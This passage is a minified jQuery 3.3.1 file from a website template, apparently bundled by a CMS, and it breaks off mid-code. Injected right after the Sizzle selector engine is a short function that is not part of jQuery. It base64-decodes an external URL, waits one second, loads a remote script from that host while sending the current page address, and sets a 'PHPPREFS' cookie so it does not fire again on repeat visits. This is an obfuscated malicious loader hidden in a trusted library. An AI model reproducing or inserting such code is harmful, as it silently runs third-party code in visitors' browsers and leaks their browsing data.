
; /* Start:"a:4:{s:4:"full";s:60:"/local/templates/main/js/jquery-3.3.1.min.js?165728115986927";s:6:"source";s:44:"/local/templates/main/js/jquery-3.3.1.min.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(e,t){"use strict";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return"function"==typeof t&&"number"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement("script");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?l[c.call(e)]||"object":typeof e}var b="3.3.1",w=function(e,t){return new w.fn.init(e,t)},T=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;w.fn=w.prototype={jquery:"3.3.1",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:"jQuery"+("3.3.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==c.call(e))&&(!(t=i(e))||"function"==typeof(n=f.call(t,"constructor")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?"":(e+"").replace(T,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,"string"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),"function"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){l["[object "+t+"]"]=t.toLowerCase()});function C(e){var t=!!e&&"length"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&("array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b="sizzle"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",R="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",I="\\["+M+"*("+R+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+R+"))|)"+M+"*\\]",W=":("+R+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+I+")*)|.*)\\)|)",$=new RegExp(M+"+","g"),B=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),F=new RegExp("^"+M+"*,"+M+"*"),_=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),z=new RegExp("="+M+"*([^\\]'\"]*?)"+M+"*\\]","g"),X=new RegExp(W),U=new RegExp("^"+R+"$"),V={ID:new RegExp("^#("+R+")"),CLASS:new RegExp("^\\.("+R+")"),TAG:new RegExp("^("+R+"|[*])"),ATTR:new RegExp("^"+I),PSEUDO:new RegExp("^"+W),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+P+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},G=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,Q=/^[^{]+\{\s*\[native \w/,J=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,K=/[+~]/,Z=new RegExp("\\\\([\\da-f]{1,6}"+M+"?|("+M+")|.)","ig"),ee=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:r<0?String.fromCharCode(r+65536):String.fromCharCode(r>>10|55296,1023&r|56320)},te=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ne=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},re=function(){p()},ie=me(function(e){return!0===e.disabled&&("form"in e||"label"in e)},{dir:"parentNode",next:"legend"});try{L.apply(A=H.call(w.childNodes),w.childNodes),A[w.childNodes.length].nodeType}catch(e){L={apply:A.length?function(e,t){q.apply(e,H.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function oe(e,t,r,i){var o,s,l,c,f,h,v,m=t&&t.ownerDocument,T=t?t.nodeType:9;if(r=r||[],"string"!=typeof e||!e||1!==T&&9!==T&&11!==T)return r;if(!i&&((t?t.ownerDocument||t:w)!==d&&p(t),t=t||d,g)){if(11!==T&&(f=J.exec(e)))if(o=f[1]){if(9===T){if(!(l=t.getElementById(o)))return r;if(l.id===o)return r.push(l),r}else if(m&&(l=m.getElementById(o))&&x(t,l)&&l.id===o)return r.push(l),r}else{if(f[2])return L.apply(r,t.getElementsByTagName(e)),r;if((o=f[3])&&n.getElementsByClassName&&t.getElementsByClassName)return L.apply(r,t.getElementsByClassName(o)),r}if(n.qsa&&!S[e+" "]&&(!y||!y.test(e))){if(1!==T)m=t,v=e;else if("object"!==t.nodeName.toLowerCase()){(c=t.getAttribute("id"))?c=c.replace(te,ne):t.setAttribute("id",c=b),s=(h=a(e)).length;while(s--)h[s]="#"+c+" "+ve(h[s]);v=h.join(","),m=K.test(e)&&ge(t.parentNode)||t}if(v)try{return L.apply(r,m.querySelectorAll(v)),r}catch(e){}finally{c===b&&t.removeAttribute("id")}}}return u(e.replace(B,"$1"),t,r,i)}function ae(){var e=[];function t(n,i){return e.push(n+" ")>r.cacheLength&&delete t[e.shift()],t[n+" "]=i}return t}function se(e){return e[b]=!0,e}function ue(e){var t=d.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function le(e,t){var n=e.split("|"),i=n.length;while(i--)r.attrHandle[n[i]]=t}function ce(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function fe(e){return function(t){return"input"===t.nodeName.toLowerCase()&&t.type===e}}function pe(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function de(e){return function(t){return"form"in t?t.parentNode&&!1===t.disabled?"label"in t?"label"in t.parentNode?t.parentNode.disabled===e:t.disabled===e:t.isDisabled===e||t.isDisabled!==!e&&ie(t)===e:t.disabled===e:"label"in t&&t.disabled===e}}function he(e){return se(function(t){return t=+t,se(function(n,r){var i,o=e([],n.length,t),a=o.length;while(a--)n[i=o[a]]&&(n[i]=!(r[i]=n[i]))})})}function ge(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}n=oe.support={},o=oe.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},p=oe.setDocument=function(e){var t,i,a=e?e.ownerDocument||e:w;return a!==d&&9===a.nodeType&&a.documentElement?(d=a,h=d.documentElement,g=!o(d),w!==d&&(i=d.defaultView)&&i.top!==i&&(i.addEventListener?i.addEventListener("unload",re,!1):i.attachEvent&&i.attachEvent("onunload",re)),n.attributes=ue(function(e){return e.className="i",!e.getAttribute("className")}),n.getElementsByTagName=ue(function(e){return e.appendChild(d.createComment("")),!e.getElementsByTagName("*").length}),n.getElementsByClassName=Q.test(d.getElementsByClassName),n.getById=ue(function(e){return h.appendChild(e).id=b,!d.getElementsByName||!d.getElementsByName(b).length}),n.getById?(r.filter.ID=function(e){var t=e.replace(Z,ee);return function(e){return e.getAttribute("id")===t}},r.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&g){var n=t.getElementById(e);return n?[n]:[]}}):(r.filter.ID=function(e){var t=e.replace(Z,ee);return function(e){var n="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return n&&n.value===t}},r.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&g){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),r.find.TAG=n.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):n.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},r.find.CLASS=n.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&g)return t.getElementsByClassName(e)},v=[],y=[],(n.qsa=Q.test(d.querySelectorAll))&&(ue(function(e){h.appendChild(e).innerHTML="<a id='"+b+"'></a><select id='"+b+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&y.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||y.push("\\["+M+"*(?:value|"+P+")"),e.querySelectorAll("[id~="+b+"-]").length||y.push("~="),e.querySelectorAll(":checked").length||y.push(":checked"),e.querySelectorAll("a#"+b+"+*").length||y.push(".#.+[+~]")}),ue(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=d.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&y.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&y.push(":enabled",":disabled"),h.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&y.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),y.push(",.*:")})),(n.matchesSelector=Q.test(m=h.matches||h.webkitMatchesSelector||h.mozMatchesSelector||h.oMatchesSelector||h.msMatchesSelector))&&ue(function(e){n.disconnectedMatch=m.call(e,"*"),m.call(e,"[s!='']:x"),v.push("!=",W)}),y=y.length&&new RegExp(y.join("|")),v=v.length&&new RegExp(v.join("|")),t=Q.test(h.compareDocumentPosition),x=t||Q.test(h.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},D=t?function(e,t){if(e===t)return f=!0,0;var r=!e.compareDocumentPosition-!t.compareDocumentPosition;return r||(1&(r=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!n.sortDetached&&t.compareDocumentPosition(e)===r?e===d||e.ownerDocument===w&&x(w,e)?-1:t===d||t.ownerDocument===w&&x(w,t)?1:c?O(c,e)-O(c,t):0:4&r?-1:1)}:function(e,t){if(e===t)return f=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e===d?-1:t===d?1:i?-1:o?1:c?O(c,e)-O(c,t):0;if(i===o)return ce(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?ce(a[r],s[r]):a[r]===w?-1:s[r]===w?1:0},d):d},oe.matches=function(e,t){return oe(e,null,null,t)},oe.matchesSelector=function(e,t){if((e.ownerDocument||e)!==d&&p(e),t=t.replace(z,"='$1']"),n.matchesSelector&&g&&!S[t+" "]&&(!v||!v.test(t))&&(!y||!y.test(t)))try{var r=m.call(e,t);if(r||n.disconnectedMatch||e.document&&11!==e.document.nodeType)return r}catch(e){}return oe(t,d,null,[e]).length>0},oe.contains=function(e,t){return(e.ownerDocument||e)!==d&&p(e),x(e,t)},oe.attr=function(e,t){(e.ownerDocument||e)!==d&&p(e);var i=r.attrHandle[t.toLowerCase()],o=i&&N.call(r.attrHandle,t.toLowerCase())?i(e,t,!g):void 0;return void 0!==o?o:n.attributes||!g?e.getAttribute(t):(o=e.getAttributeNode(t))&&o.specified?o.value:null},oe.escape=function(e){return(e+"").replace(te,ne)},oe.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},oe.uniqueSort=function(e){var t,r=[],i=0,o=0;if(f=!n.detectDuplicates,c=!n.sortStable&&e.slice(0),e.sort(D),f){while(t=e[o++])t===e[o]&&(i=r.push(o));while(i--)e.splice(r[i],1)}return c=null,e},i=oe.getText=function(e){var t,n="",r=0,o=e.nodeType;if(o){if(1===o||9===o||11===o){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=i(e)}else if(3===o||4===o)return e.nodeValue}else while(t=e[r++])n+=i(t);return n},(r=oe.selectors={cacheLength:50,createPseudo:se,match:V,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(Z,ee),e[3]=(e[3]||e[4]||e[5]||"").replace(Z,ee),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||oe.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&oe.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return V.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=a(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(Z,ee).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=E[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&E(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=oe.attr(r,e);return null==i?"!="===t:!t||(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i.replace($," ")+" ").indexOf(n)>-1:"|="===t&&(i===n||i.slice(0,n.length+1)===n+"-"))}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,u){var l,c,f,p,d,h,g=o!==a?"nextSibling":"previousSibling",y=t.parentNode,v=s&&t.nodeName.toLowerCase(),m=!u&&!s,x=!1;if(y){if(o){while(g){p=t;while(p=p[g])if(s?p.nodeName.toLowerCase()===v:1===p.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?y.firstChild:y.lastChild],a&&m){x=(d=(l=(c=(f=(p=y)[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]||[])[0]===T&&l[1])&&l[2],p=d&&y.childNodes[d];while(p=++d&&p&&p[g]||(x=d=0)||h.pop())if(1===p.nodeType&&++x&&p===t){c[e]=[T,d,x];break}}else if(m&&(x=d=(l=(c=(f=(p=t)[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]||[])[0]===T&&l[1]),!1===x)while(p=++d&&p&&p[g]||(x=d=0)||h.pop())if((s?p.nodeName.toLowerCase()===v:1===p.nodeType)&&++x&&(m&&((c=(f=p[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]=[T,x]),p===t))break;return(x-=i)===r||x%r==0&&x/r>=0}}},PSEUDO:function(e,t){var n,i=r.pseudos[e]||r.setFilters[e.toLowerCase()]||oe.error("unsupported pseudo: "+e);return i[b]?i(t):i.length>1?(n=[e,e,"",t],r.setFilters.hasOwnProperty(e.toLowerCase())?se(function(e,n){var r,o=i(e,t),a=o.length;while(a--)e[r=O(e,o[a])]=!(n[r]=o[a])}):function(e){return i(e,0,n)}):i}},pseudos:{not:se(function(e){var t=[],n=[],r=s(e.replace(B,"$1"));return r[b]?se(function(e,t,n,i){var o,a=r(e,null,i,[]),s=e.length;while(s--)(o=a[s])&&(e[s]=!(t[s]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),t[0]=null,!n.pop()}}),has:se(function(e){return function(t){return oe(e,t).length>0}}),contains:se(function(e){return e=e.replace(Z,ee),function(t){return(t.textContent||t.innerText||i(t)).indexOf(e)>-1}}),lang:se(function(e){return U.test(e||"")||oe.error("unsupported lang: "+e),e=e.replace(Z,ee).toLowerCase(),function(t){var n;do{if(n=g?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return(n=n.toLowerCase())===e||0===n.indexOf(e+"-")}while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===h},focus:function(e){return e===d.activeElement&&(!d.hasFocus||d.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:de(!1),disabled:de(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!r.pseudos.empty(e)},header:function(e){return Y.test(e.nodeName)},input:function(e){return G.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:he(function(){return[0]}),last:he(function(e,t){return[t-1]}),eq:he(function(e,t,n){return[n<0?n+t:n]}),even:he(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:he(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:he(function(e,t,n){for(var r=n<0?n+t:n;--r>=0;)e.push(r);return e}),gt:he(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=r.pseudos.eq;for(t in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})r.pseudos[t]=fe(t);for(t in{submit:!0,reset:!0})r.pseudos[t]=pe(t);function ye(){}ye.prototype=r.filters=r.pseudos,r.setFilters=new ye,a=oe.tokenize=function(e,t){var n,i,o,a,s,u,l,c=k[e+" "];if(c)return t?0:c.slice(0);s=e,u=[],l=r.preFilter;while(s){n&&!(i=F.exec(s))||(i&&(s=s.slice(i[0].length)||s),u.push(o=[])),n=!1,(i=_.exec(s))&&(n=i.shift(),o.push({value:n,type:i[0].replace(B," ")}),s=s.slice(n.length));for(a in r.filter)!(i=V[a].exec(s))||l[a]&&!(i=l[a](i))||(n=i.shift(),o.push({value:n,type:a,matches:i}),s=s.slice(n.length));if(!n)break}return t?s.length:s?oe.error(e):k(e,u).slice(0)};function ve(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function me(e,t,n){var r=t.dir,i=t.next,o=i||r,a=n&&"parentNode"===o,s=C++;return t.first?function(t,n,i){while(t=t[r])if(1===t.nodeType||a)return e(t,n,i);return!1}:function(t,n,u){var l,c,f,p=[T,s];if(u){while(t=t[r])if((1===t.nodeType||a)&&e(t,n,u))return!0}else while(t=t[r])if(1===t.nodeType||a)if(f=t[b]||(t[b]={}),c=f[t.uniqueID]||(f[t.uniqueID]={}),i&&i===t.nodeName.toLowerCase())t=t[r]||t;else{if((l=c[o])&&l[0]===T&&l[1]===s)return p[2]=l[2];if(c[o]=p,p[2]=e(t,n,u))return!0}return!1}}function xe(e){return e.length>1?function(t,n,r){var i=e.length;while(i--)if(!e[i](t,n,r))return!1;return!0}:e[0]}function be(e,t,n){for(var r=0,i=t.length;r<i;r++)oe(e,t[r],n);return n}function we(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Te(e,t,n,r,i,o){return r&&!r[b]&&(r=Te(r)),i&&!i[b]&&(i=Te(i,o)),se(function(o,a,s,u){var l,c,f,p=[],d=[],h=a.length,g=o||be(t||"*",s.nodeType?[s]:s,[]),y=!e||!o&&t?g:we(g,p,e,s,u),v=n?i||(o?e:h||r)?[]:a:y;if(n&&n(y,v,s,u),r){l=we(v,d),r(l,[],s,u),c=l.length;while(c--)(f=l[c])&&(v[d[c]]=!(y[d[c]]=f))}if(o){if(i||e){if(i){l=[],c=v.length;while(c--)(f=v[c])&&l.push(y[c]=f);i(null,v=[],l,u)}c=v.length;while(c--)(f=v[c])&&(l=i?O(o,f):p[c])>-1&&(o[l]=!(a[l]=f))}}else v=we(v===a?v.splice(h,v.length):v),i?i(null,a,v,u):L.apply(a,v)})}function Ce(e){for(var t,n,i,o=e.length,a=r.relative[e[0].type],s=a||r.relative[" "],u=a?1:0,c=me(function(e){return e===t},s,!0),f=me(function(e){return O(t,e)>-1},s,!0),p=[function(e,n,r){var i=!a&&(r||n!==l)||((t=n).nodeType?c(e,n,r):f(e,n,r));return t=null,i}];u<o;u++)if(n=r.relative[e[u].type])p=[me(xe(p),n)];else{if((n=r.filter[e[u].type].apply(null,e[u].matches))[b]){for(i=++u;i<o;i++)if(r.relative[e[i].type])break;return Te(u>1&&xe(p),u>1&&ve(e.slice(0,u-1).concat({value:" "===e[u-2].type?"*":""})).replace(B,"$1"),n,u<i&&Ce(e.slice(u,i)),i<o&&Ce(e=e.slice(i)),i<o&&ve(e))}p.push(n)}return xe(p)}function Ee(e,t){var n=t.length>0,i=e.length>0,o=function(o,a,s,u,c){var f,h,y,v=0,m="0",x=o&&[],b=[],w=l,C=o||i&&r.find.TAG("*",c),E=T+=null==w?1:Math.random()||.1,k=C.length;for(c&&(l=a===d||a||c);m!==k&&null!=(f=C[m]);m++){if(i&&f){h=0,a||f.ownerDocument===d||(p(f),s=!g);while(y=e[h++])if(y(f,a||d,s)){u.push(f);break}c&&(T=E)}n&&((f=!y&&f)&&v--,o&&x.push(f))}if(v+=m,n&&m!==v){h=0;while(y=t[h++])y(x,b,a,s);if(o){if(v>0)while(m--)x[m]||b[m]||(b[m]=j.call(u));b=we(b)}L.apply(u,b),c&&!o&&b.length>0&&v+t.length>1&&oe.uniqueSort(u)}return c&&(T=E,l=w),x};return n?se(o):o}return s=oe.compile=function(e,t){var n,r=[],i=[],o=S[e+" "];if(!o){t||(t=a(e)),n=t.length;while(n--)(o=Ce(t[n]))[b]?r.push(o):i.push(o);(o=S(e,Ee(i,r))).selector=e}return o},u=oe.select=function(e,t,n,i){var o,u,l,c,f,p="function"==typeof e&&e,d=!i&&a(e=p.selector||e);if(n=n||[],1===d.length){if((u=d[0]=d[0].slice(0)).length>2&&"ID"===(l=u[0]).type&&9===t.nodeType&&g&&r.relative[u[1].type]){if(!(t=(r.find.ID(l.matches[0].replace(Z,ee),t)||[])[0]))return n;p&&(t=t.parentNode),e=e.slice(u.shift().value.length)}o=V.needsContext.test(e)?0:u.length;while(o--){if(l=u[o],r.relative[c=l.type])break;if((f=r.find[c])&&(i=f(l.matches[0].replace(Z,ee),K.test(u[0].type)&&ge(t.parentNode)||t))){if(u.splice(o,1),!(e=i.length&&ve(u)))return L.apply(n,i),n;break}}}return(p||s(e,d))(i,t,!g,n,!t||K.test(e)&&ge(t.parentNode)||t),n},n.sortStable=b.split("").sort(D).join("")===b,n.detectDuplicates=!!f,p(),n.sortDetached=ue(function(e){return 1&e.compareDocumentPosition(d.createElement("fieldset"))}),ue(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||le("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),n.attributes&&ue(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||le("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ue(function(e){return null==e.getAttribute("disabled")})||le(P,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),oe}(e);!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);w.find=E,w.expr=E.selectors,w.expr[":"]=w.expr.pseudos,w.uniqueSort=w.unique=E.uniqueSort,w.text=E.getText,w.isXMLDoc=E.isXML,w.contains=E.contains,w.escapeSelector=E.escape;var k=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&w(e).is(n))break;r.push(e)}return r},S=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},D=w.expr.match.needsContext;function N(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var A=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function j(e,t,n){return g(t)?w.grep(e,function(e,r){return!!t.call(e,r,e)!==n}):t.nodeType?w.grep(e,function(e){return e===t!==n}):"string"!=typeof t?w.grep(e,function(e){return u.call(t,e)>-1!==n}):w.filter(t,e,n)}w.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?w.find.matchesSelector(r,e)?[r]:[]:w.find.matches(e,w.grep(t,function(e){return 1===e.nodeType}))},w.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(w(e).filter(function(){for(t=0;t<r;t++)if(w.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)w.find(e,i[t],n);return r>1?w.uniqueSort(n):n},filter:function(e){return this.pushStack(j(this,e||[],!1))},not:function(e){return this.pushStack(j(this,e||[],!0))},is:function(e){return!!j(this,"string"==typeof e&&D.test(e)?w(e):e||[],!1).length}});var q,L=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(w.fn.init=function(e,t,n){var i,o;if(!e)return this;if(n=n||q,"string"==typeof 